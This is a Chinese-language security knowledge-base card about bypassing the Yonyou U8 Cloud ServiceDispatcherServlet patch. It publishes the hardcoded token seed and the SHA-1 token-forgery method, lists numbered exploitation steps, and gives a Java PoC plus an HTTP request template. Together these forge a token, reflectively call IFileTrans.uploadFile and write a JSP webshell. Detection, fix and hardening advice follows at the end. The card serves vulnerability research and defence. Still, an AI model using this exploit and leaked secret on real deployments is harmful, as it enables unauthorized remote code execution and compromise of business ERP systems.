---
id: web-java-component-yonyou-u8cloud-servicedispatcher-patch-bypass-token-upload
title: 用友 U8 Cloud ServiceDispatcherServlet 补丁绕过：硬编码 tenantId 伪造 token + 长度前缀 InvocationInfo 反序列化写 WebShell
type: scenario
domain: web
path: web/java/component
technique: yonyou-u8cloud-servicedispatcher-patch-bypass-tenant-token-upload
tags:
- java
- yonyou
- u8-cloud
- deserialization
- invocationinfo
- patch-bypass
- token-forgery
- hardcoded-secret
- file-upload
- webshell
cve: []
severity: critical
confidence: medium
affected_versions: 2.0 2.1 2.3 2.5 2.6 2.65 2.7 3.0 3.1 3.2 3.5 3.6 5.0 5.0sp 5.1 5.1sp
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V61
  verified_at: '2026-11-05T11:53:05+08:00'
  notes: 已对照原文与图01-10核对：execCall→NetObjectInputStream.readObject 先 readInt 取4字节大端长度（图01/07/08）、TokenUtil.verifyToken/equalsIgnoreCase（图01/02）、补丁前种子读 tokenSeed.conf（图03，图05线上值 ab7d823e-03ef-39c1-9947-060a0a08b931）、补丁后改读 Tenant.properties tenantId（图04）、FileTransImpl.uploadFile 增加 NCHOME/webapps/u8c_web 的 canonical startsWith 检查并抛 Illegal File Path（图06）、PoC 写 webapps/u8c_web/1.jsp 后 GET /1.jsp 返回 u8c（图09/10），均与卡一致。未验证点：原文 PoC 相对路径为何绕过补丁的 canonical 检查未解释（卡内已如实标注）；tenantId 与旧种子同值仅原文口述，图05展示的是 tokenSeed.conf 而非 Tenant.properties；PoC 未在本机复跑；frontmatter 无 sources/source_url（全库惯例）。
url: /docs/web/java/component/web-java-component-yonyou-u8cloud-servicedispatcher-patch-bypass-token-upload/
draft: false
kb_aliases:
- 用友 U8Cloud 反序列化补丁绕过
- ServiceDispatcherServlet 补丁绕过
- Tenant.properties tenantId 硬编码
- tokenSeed 硬编码伪造 token
- NetObjectInputStream 长度前缀
- U8Cloud 任意文件上传
- FileTransImpl uploadFile 路径限制
---

## 一句话结论

用友 U8 Cloud 全版本的 `/ServiceDispatcherServlet` 反序列化鉴权补丁可被绕过：补丁把 token 种子来源从 `ierp/bin/token/tokenSeed.conf` 改为 `ierp/bin/token/Tenant.properties` 的 `tenantId`，但该值仍是硬编码 `ab7d823e-03ef-39c1-9947-060a0a08b931`；攻击者用 `hex(SHA1(userCode + seed))` 离线伪造 token 后，发送“4 字节大端长度 + InvocationInfo 序列化体”，即可反射调用 `IFileTrans#uploadFile`，把 ZIP 中的 JSP 解压写入 Web 目录 getshell。

## 原理

- **入口与长度前缀**：`ServiceDispatcher#execCall` 处理 `/ServiceDispatcherServlet` 的 POST 请求，用 `NetObjectInputStream.readObject(request.getInputStream(), streamRet, lsizes)` 反序列化 `InvocationInfo`。该方法先调用 `NetObjectInputStream.readInt` 读 4 个字节（`ch1<<24 + ch2<<16 + ch3<<8 + ch4`），把结果当作后续序列化体的字节长度，按长度读满后再交给 `NetObjectInputStream.readObject()`。因此裸序列化字节不会被正确解析，报文必须以 4 字节大端长度开头。
- **鉴权与 token 算法**：反序列化后 `execCall` 调用 `TokenUtil.getInstance().verifyToken(invInfo.getToken(), invInfo.getServiceName(), getAddr(request))`；在非单机/非 master 且服务、IP 不受信任时进入 `verifyTokenIllegal()`：`userCode` 取自反序列化对象的 `InvocationInfoProxy.getUserCode()`，`curToken = genToken(userCode)`，用 `equalsIgnoreCase` 与请求 token 比较。`genToken` 方法名虽为 md5，实际是 SHA-1：先 `update(userCode.getBytes())` 再 `update(tokenSeed)`，摘要转十六进制。因此 token 完全可由 `userCode + 种子` 离线计算。
- **补丁为何可绕过**：补丁把种子读取位置从 `${NCHOME}/ierp/bin/token/tokenSeed.conf` 的 `tokenseed` 改为 `${NCHOME}/ierp/bin/token/Tenant.properties` 的 `tenantId`，但原文通过代码与线上环境确认该值仍是硬编码 `ab7d823e-03ef-39c1-9947-060a0a08b931`。换文件不换值，种子依然可预测，补丁只改变了读取路径而没有引入每部署随机性，所以伪造 token 依旧通过。
- **反射调用与文件写入 sink**：校验通过后按 `InvocationInfo` 的 `serviceName`、`methodName`、`parameterTypes`、`parameters` 反射调用容器 Bean。`nc.itf.hr.tools.IFileTrans#uploadFile(byte[] data, String remoteAbsPath)` 的实现是先 `ZipUtil.extract(data)` 再 `new FileOutputStream(remoteAbsPath).write(data)`，不校验扩展名；把含 JSP 的 ZIP 和 Web 目录路径传进去即可落地 WebShell。
- **补丁的路径限制**：补丁在 `FileTransImpl#uploadFile` 中增加了检查——若 `new File(remoteAbsPath).getCanonicalPath()` 以 `${NCHOME}/webapps/u8c_web/` 的 canonical path 开头，则抛 `Illegal File Path`。原文 PoC 仍使用相对路径 `webapps/u8c_web/1.jsp` 并成功写入、访问（GET `/1.jsp` 返回 `u8c`）；相对路径的 canonical 结果取决于进程工作目录，该检查为何未拦住原文未说明，此点按原文记录，未复验。

## 触发条件

- 目标为受影响的 U8 Cloud 版本（原文列出 2.0、2.1、2.3、2.5、2.6、2.65、2.7、3.0、3.1、3.2、3.5、3.6、5.0、5.0sp、5.1、5.1sp），`/ServiceDispatcherServlet` 可从攻击者网络访问。
- 服务端 classpath 存在 `nc.itf.hr.tools.IFileTrans#uploadFile`，且 Web 目录对应用进程可写、JSP 可被容器解析。
- 攻击者知道硬编码种子（源码、配置文件泄露或本文公开值）。
- 能构造与 `NetObjectOutputStream` 兼容的 `InvocationInfo` 序列化体，并在前面加 4 字节大端长度。

## 利用步骤

1. 访问 `/ServiceDispatcherServlet` 确认路由存在（POST，二进制 body）。
2. 计算 token：`hex(SHA1(userCode_bytes + seed_bytes))`，`userCode` 常用 `#UAP#`，种子为 `ab7d823e-03ef-39c1-9947-060a0a08b931`。
3. 把 JSP 内容打包成 ZIP（单个条目即可），读取 ZIP 字节。
4. 构造 `InvocationInfo`：`serviceName=nc.itf.hr.tools.IFileTrans`、`methodName=uploadFile`、`parameterTypes={byte[].class, String.class}`、`parameters={zipBytes, "webapps/u8c_web/1.jsp"}`，并 `setToken(...)`。
5. 用 `NetObjectOutputStream` 序列化对象，取序列化体长度写成 4 字节大端头，拼在序列化体前；原文用 hex 编辑器粘贴后解码为原始字节发送。
6. POST 到 `/ServiceDispatcherServlet`，随后访问 `/1.jsp` 验证执行（原文返回 `u8c`）。

## PoC

原文为 Java 构造序列化报文，核心步骤可压缩为：

```java
byte[] seed = "ab7d823e-03ef-39c1-9947-060a0a08b931".getBytes();
byte[] user = "#UAP#".getBytes();
MessageDigest sha1 = MessageDigest.getInstance("SHA-1");
sha1.update(user);
sha1.update(seed);
String token = MD5Util.byteToHexString(sha1.digest());

// JSP 打包为单条目 ZIP
byte[] zip = zipOf("compressed", jspBytes);

InvocationInfo info = new InvocationInfo(
    "nc.itf.hr.tools.IFileTrans", "uploadFile",
    new Class[]{byte[].class, String.class},
    new Object[]{zip, "webapps/u8c_web/1.jsp"});
info.setToken(token);

ByteArrayOutputStream body = new ByteArrayOutputStream();
NetObjectOutputStream out = new NetObjectOutputStream(body);
out.writeObject(info);
out.finish();
out.flush();
byte[] ser = body.toByteArray();

byte[] packet = new byte[4 + ser.length];
packet[0] = (byte) (ser.length >>> 24);
packet[1] = (byte) (ser.length >>> 16);
packet[2] = (byte) (ser.length >>> 8);
packet[3] = (byte) ser.length;
System.arraycopy(ser, 0, packet, 4, ser.length);
// packet 即 POST /ServiceDispatcherServlet 的原始 body
```

```http
POST /ServiceDispatcherServlet HTTP/1.1
Host: target
Content-Type: application/octet-stream

<4 字节大端长度 + InvocationInfo 序列化体>
```

成功特征：POST 返回 200 二进制响应，随后 GET `/1.jsp` 返回写入内容（原文为 `u8c`）。

## 变体与关联

- 关联：[[web-java-component-yonyou-u8-servicedispatcher-invocationinfo-token-file-write]]——同入口、同 sink 的原始链；本卡补充补丁后的种子来源（Tenant.properties tenantId）、4 字节长度前缀和 uploadFile 路径限制。
- 关联：[[web-java-component-yonyou-u8-nccloudgateway-ifiletrans-file-upload]]——另一入口 `NCCloudGatewayServlet` 反射调用同一 `IFileTrans.uploadFile`。
- 变体：若目标部署的 `Tenant.properties` 中 tenantId 被改成非默认值，需先取得该文件；仍使用旧 `tokenSeed.conf` 的版本则用旧种子。
- 变体：反射调用面不限于 `uploadFile`，其它可写文件/可执行操作的 Bean 方法可复用同一 token 伪造与序列化入口。
- 边界：原文未说明演示环境是否启用了补丁中的 uploadFile 路径限制；若目标已启用且仅允许非 Web 目录，需要另找可解析目录或其它写文件 sink。

## 检测与防御

- 检测：`/ServiceDispatcherServlet` 收到二进制 POST，前 4 字节大端值等于剩余 body 长度；序列化体内出现 `InvocationInfo`、`nc.itf.hr.tools.IFileTrans`、`uploadFile`；响应为二进制；Web 目录新增 JSP 文件。
- 修复：升级官方安全补丁；token 种子改为每部署随机生成并保护 `Tenant.properties`，移除硬编码默认值；对 `InvocationInfo` 的 `serviceName`/`methodName` 做白名单，禁止反射调用文件写入类方法。
- 加固：限制 `/ServiceDispatcherServlet` 仅可信来源访问；Web 目录对应用进程只读；`uploadFile` 同时校验 canonical path 与实际写入路径并禁止 Web 目录；监控 Web 目录文件变更。
